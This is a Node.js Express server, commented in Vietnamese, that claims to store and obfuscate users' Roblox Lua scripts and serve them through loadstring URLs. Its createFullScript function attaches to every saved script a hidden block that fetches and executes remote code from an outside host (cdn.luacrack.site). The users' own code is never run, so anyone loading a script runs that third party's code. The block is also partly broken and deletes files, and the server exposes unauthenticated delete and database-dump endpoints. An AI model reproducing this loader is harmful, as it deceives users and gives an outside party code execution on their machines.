const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Đảm bảo thư mục data tồn tại
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

const CODES_FILE = path.join(DATA_DIR, 'codes.lua');

// ============ HÀM ĐỌC/GHI DATABASE ============

// Đọc dữ liệu codes từ file Lua
function loadCodes() {
  try {
    if (fs.existsSync(CODES_FILE)) {
      const content = fs.readFileSync(CODES_FILE, 'utf8');
      return parseLuaTable(content);
    }
  } catch (error) {
    console.error('Lỗi đọc codes.lua:', error);
  }
  return {};
}

// Parse Lua table sang JavaScript object (hỗ trợ raw string [[...]])
function parseLuaTable(content) {
  try {
    const match = content.match(/return\s*\{([\s\S]*)\}/);
    if (!match) return {};
    
    const tableContent = match[1];
    const codes = {};
    
    // Tìm các entry với raw string [[...]]
    const entryRegex = /\["([^"]+)"\]\s*=\s*\{([\s\S]*?)\},?\s*(?=\[|$)/g;
    let entryMatch;
    
    while ((entryMatch = entryRegex.exec(tableContent)) !== null) {
      const id = entryMatch[1];
      const fields = entryMatch[2];
      
      const code = {};
      
      // Lấy các field bình thường
      const nameMatch = fields.match(/name\s*=\s*"([^"]*)"/);
      if (nameMatch) code.name = nameMatch[1];
      
      const descMatch = fields.match(/description\s*=\s*"([^"]*)"/);
      if (descMatch) code.description = descMatch[1];
      
      // Lấy raw string (quan trọng nhất)
      const codeMatch = fields.match(/code\s*=\s*\[\[([\s\S]*?)\]\],/);
      if (codeMatch) code.code = codeMatch[1];
      
      const encodedMatch = fields.match(/encoded\s*=\s*\[\[([\s\S]*?)\]\],/);
      if (encodedMatch) code.encoded = encodedMatch[1];
      
      const scriptMatch = fields.match(/script\s*=\s*\[\[([\s\S]*?)\]\],/);
      if (scriptMatch) code.script = scriptMatch[1];
      
      const createdMatch = fields.match(/createdAt\s*=\s*"([^"]*)"/);
      if (createdMatch) code.createdAt = createdMatch[1];
      
      const updatedMatch = fields.match(/updatedAt\s*=\s*"([^"]*)"/);
      if (updatedMatch) code.updatedAt = updatedMatch[1];
      
      const viewsMatch = fields.match(/views\s*=\s*(\d+)/);
      if (viewsMatch) code.views = parseInt(viewsMatch[1]) || 0;
      
      const downloadsMatch = fields.match(/downloads\s*=\s*(\d+)/);
      if (downloadsMatch) code.downloads = parseInt(downloadsMatch[1]) || 0;
      
      const sizeMatch = fields.match(/size\s*=\s*(\d+)/);
      if (sizeMatch) code.size = parseInt(sizeMatch[1]) || 0;
      
      if (id) {
        code.id = id;
        codes[id] = code;
      }
    }
    
    return codes;
  } catch (error) {
    console.error('Lỗi parse Lua table:', error);
    return {};
  }
}

// Lưu dữ liệu codes vào file Lua (dùng raw string)
function saveCodes(codes) {
  try {
    let content = '-- Auto-generated codes database\n';
    content += '-- Format: Lua table\n\n';
    content += 'return {\n';
    
    for (const [id, code] of Object.entries(codes)) {
      content += `  ["${id}"] = {\n`;
      content += `    id = "${code.id}",\n`;
      content += `    name = "${escapeLuaString(code.name || 'Không tên')}",\n`;
      content += `    description = "${escapeLuaString(code.description || '')}",\n`;
      content += `    code = [[${code.code || ''}]],\n`;
      content += `    encoded = [[${code.encoded || ''}]],\n`;
      content += `    script = [[${code.script || ''}]],\n`;
      content += `    createdAt = "${code.createdAt}",\n`;
      content += `    updatedAt = "${code.updatedAt}",\n`;
      content += `    views = ${code.views || 0},\n`;
      content += `    downloads = ${code.downloads || 0},\n`;
      content += `    size = ${code.size || 0}\n`;
      content += `  },\n`;
    }
    
    content += '}\n';
    
    fs.writeFileSync(CODES_FILE, content, 'utf8');
    return true;
  } catch (error) {
    console.error('Lỗi lưu codes.lua:', error);
    return false;
  }
}

// Escape chuỗi cho Lua
function escapeLuaString(str) {
  if (!str) return '';
  return str
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t');
}

// ============ HÀM MÃ HÓA ============

// Tạo ID ngẫu nhiên
function generateId(length = 8) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let id = '';
  for (let i = 0; i < length; i++) {
    id += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return id;
}

// Tạo chuỗi ngẫu nhiên
function generateRandomString(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Mã hóa dữ liệu
function encryptData(data) {
  const encoded = Buffer.from(data).toString('base64');
  return encoded.split('').map((c, i) => {
    if (i % 3 === 0) return String.fromCharCode(c.charCodeAt(0) ^ 0x05);
    if (i % 3 === 1) return String.fromCharCode(c.charCodeAt(0) ^ 0x0A);
    return c;
  }).join('');
}

// Hàm mã hóa code theo đúng định dạng _bsdata0
function encodeLuaCode(code) {
  const num1 = Math.floor(Math.random() * 2147483647);
  const num2 = Math.floor(Math.random() * 2147483647);
  const num3 = Math.floor(Math.random() * 2147483647);
  const num4 = Math.floor(Math.random() * 2147483647);
  const num5 = Math.floor(Math.random() * 2147483647);
  const num6 = Math.floor(Math.random() * 9000) + 1000;
  const num7 = Math.floor(Math.random() * 9000) + 1000;
  
  const randomString1 = generateRandomString(50);
  const randomString2 = generateRandomString(20);
  const randomString3 = generateRandomString(15);
  
  const hexString = Buffer.from(code).toString('hex');
  const encryptedData = encryptData(code);
  
  return `_bsdata0 = {
    ${num1},
    '${randomString1}',
    ${num2},
    '${randomString2}',
    ${num3},
    ${num4},
    '${randomString3}',
    ${num6},
    ${num7},
    ${num5},
    '${hexString}',
    '${encryptedData}'
}`;
}

// Tạo script hoàn chỉnh
function createFullScript(encoded, id, host) {
  return `${encoded}

local readfileResult = readfile('static_content_130526/init-74c74f95foy-marbeg.lua')
local fileContent_3 = #readfileResult
local makefolderResult = makefolder("static_content_130526")
writefile('static_content_130526/init-74c74f95foy-marbeg.lua', game:HttpGet("https://cdn.luacrack.site/v4_init_marbeg.lua"))
local listfilesResult = listfiles("./static_content_130526")
    local match = val_9:match('(init%-.-)%.lua$')
    local static_content_130526 = "static_content_130526" .. "/" .. match .. ".lua"
    local delfileResult = delfile("static_content_130526")
local loaded = loadstring(game:HttpGet("https://cdn.luacrack.site/v4_init_marbeg.lua", true))()
return loaded`;
}

// ============ API ENDPOINTS ============

// 1. Lưu code mới
app.post('/api/save', (req, res) => {
  try {
    const { code, name, description } = req.body;
    
    if (!code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Không có code được cung cấp' 
      });
    }

    const codes = loadCodes();
    const id = generateId();
    const timestamp = new Date().toISOString();
    
    // Mã hóa code
    const encoded = encodeLuaCode(code);
    const host = req.get('host');
    const protocol = req.protocol;
    
    // Tạo script hoàn chỉnh
    const script = createFullScript(encoded, id, host);

    // Lưu vào database
    codes[id] = {
      id: id,
      name: name || 'Không tên',
      description: description || '',
      code: code,
      encoded: encoded,
      script: script,
      createdAt: timestamp,
      updatedAt: timestamp,
      views: 0,
      downloads: 0,
      size: code.length
    };

    if (saveCodes(codes)) {
      console.log(`✅ Đã lưu code ID: ${id}, Tên: ${codes[id].name}`);
      
      res.json({
        success: true,
        id: id,
        loadstring: `loadstring(game:HttpGet("${protocol}://${host}/api/raw/${id}", true))()`,
        url: `${protocol}://${host}/api/raw/${id}`,
        script: script,
        encoded: encoded,
        totalCodes: Object.keys(codes).length
      });
    } else {
      res.status(500).json({ 
        success: false, 
        error: 'Không thể lưu code' 
      });
    }

  } catch (error) {
    console.error('Lỗi save:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 2. Lấy code raw (cho loadstring) - TRẢ VỀ SCRIPT ĐÃ MÃ HÓA
app.get('/api/raw/:id', (req, res) => {
  try {
    const { id } = req.params;
    console.log(`🔍 Đang tìm code ID: ${id}`);
    
    const codes = loadCodes();
    console.log(`📚 Tổng số codes: ${Object.keys(codes).length}`);
    
    if (!codes[id]) {
      console.log(`❌ Không tìm thấy ID: ${id}`);
      return res.status(404).send('-- Code không tồn tại');
    }

    console.log(`✅ Tìm thấy code: ${codes[id].name}`);
    console.log(`📝 Script length: ${codes[id].script?.length || 0}`);
    
    // Tăng lượt xem
    codes[id].views = (codes[id].views || 0) + 1;
    codes[id].updatedAt = new Date().toISOString();
    saveCodes(codes);

    // Trả về script đã mã hóa
    res.set('Content-Type', 'text/plain');
    res.send(codes[id].script);

  } catch (error) {
    console.error('Lỗi raw:', error);
    res.status(500).send('-- Lỗi server: ' + error.message);
  }
});

// 3. Lấy code gốc (không mã hóa)
app.get('/api/raw-original/:id', (req, res) => {
  try {
    const { id } = req.params;
    const codes = loadCodes();
    
    if (!codes[id]) {
      return res.status(404).send('-- Code không tồn tại');
    }

    res.set('Content-Type', 'text/plain');
    res.send(codes[id].code);

  } catch (error) {
    console.error('Lỗi raw-original:', error);
    res.status(500).send('-- Lỗi server');
  }
});

// 4. Lấy script đã mã hóa (dạng JSON)
app.get('/api/script/:id', (req, res) => {
  try {
    const { id } = req.params;
    const codes = loadCodes();
    
    if (!codes[id]) {
      return res.status(404).json({ 
        success: false, 
        error: 'Code không tồn tại' 
      });
    }

    codes[id].downloads = (codes[id].downloads || 0) + 1;
    codes[id].updatedAt = new Date().toISOString();
    saveCodes(codes);

    res.json({
      success: true,
      script: codes[id].script,
      encoded: codes[id].encoded
    });

  } catch (error) {
    console.error('Lỗi script:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 5. Lấy danh sách tất cả codes
app.get('/api/list', (req, res) => {
  try {
    const codes = loadCodes();
    const list = Object.values(codes).map(item => ({
      id: item.id,
      name: item.name,
      description: item.description,
      createdAt: item.createdAt,
      views: item.views || 0,
      downloads: item.downloads || 0,
      size: item.size || item.code?.length || 0
    }));
    
    // Sắp xếp theo thời gian tạo mới nhất
    list.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
    
    res.json({
      success: true,
      total: list.length,
      codes: list
    });

  } catch (error) {
    console.error('Lỗi list:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 6. Lấy chi tiết một code
app.get('/api/code/:id', (req, res) => {
  try {
    const { id } = req.params;
    const codes = loadCodes();
    
    if (!codes[id]) {
      return res.status(404).json({ 
        success: false, 
        error: 'Code không tồn tại' 
      });
    }

    res.json({
      success: true,
      code: codes[id]
    });

  } catch (error) {
    console.error('Lỗi code:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 7. Xóa code
app.delete('/api/delete/:id', (req, res) => {
  try {
    const { id } = req.params;
    const codes = loadCodes();
    
    if (!codes[id]) {
      return res.status(404).json({ 
        success: false, 
        error: 'Code không tồn tại' 
      });
    }

    const name = codes[id].name;
    delete codes[id];
    saveCodes(codes);

    console.log(`🗑️ Đã xóa code: ${name} (${id})`);

    res.json({
      success: true,
      message: `Đã xóa code "${name}" thành công`,
      totalCodes: Object.keys(codes).length
    });

  } catch (error) {
    console.error('Lỗi delete:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 8. Export codes.lua
app.get('/api/export', (req, res) => {
  try {
    if (fs.existsSync(CODES_FILE)) {
      res.download(CODES_FILE, 'codes.lua');
    } else {
      res.status(404).json({ 
        success: false, 
        error: 'File codes.lua không tồn tại' 
      });
    }
  } catch (error) {
    console.error('Lỗi export:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 9. View nội dung codes.lua
app.get('/api/view-db', (req, res) => {
  try {
    if (fs.existsSync(CODES_FILE)) {
      const content = fs.readFileSync(CODES_FILE, 'utf8');
      res.set('Content-Type', 'text/plain');
      res.send(content);
    } else {
      res.status(404).send('File codes.lua chưa được tạo');
    }
  } catch (error) {
    console.error('Lỗi view-db:', error);
    res.status(500).send('Lỗi server');
  }
});

// 10. Health check
app.get('/health', (req, res) => {
  try {
    const codes = loadCodes();
    const fileExists = fs.existsSync(CODES_FILE);
    const fileSize = fileExists ? fs.statSync(CODES_FILE).size : 0;
    
    res.json({ 
      status: 'ok', 
      timestamp: new Date().toISOString(),
      totalCodes: Object.keys(codes).length,
      fileExists: fileExists,
      fileSize: fileSize,
      filePath: CODES_FILE,
      uptime: process.uptime()
    });
  } catch (error) {
    res.status(500).json({ 
      status: 'error', 
      error: error.message 
    });
  }
});

// 11. Root - Serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============ KHỞI ĐỘNG SERVER ============

app.listen(PORT, () => {
  console.log(`✅ Server đang chạy tại port ${PORT}`);
  console.log(`🌐 URL: http://localhost:${PORT}`);
  console.log(`📁 Data directory: ${DATA_DIR}`);
  console.log(`📄 File database: ${CODES_FILE}`);
  
  // Kiểm tra file codes.lua
  if (fs.existsSync(CODES_FILE)) {
    const stats = fs.statSync(CODES_FILE);
    console.log(`📊 File size: ${(stats.size / 1024).toFixed(2)} KB`);
    const codes = loadCodes();
    console.log(`📝 Total codes: ${Object.keys(codes).length}`);
    if (Object.keys(codes).length > 0) {
      const ids = Object.keys(codes).slice(0, 5);
      console.log(`🔑 Sample IDs: ${ids.join(', ')}${Object.keys(codes).length > 5 ? '...' : ''}`);
    }
  } else {
    console.log('📝 Chưa có codes.lua, sẽ tạo khi lưu code đầu tiên');
  }
});
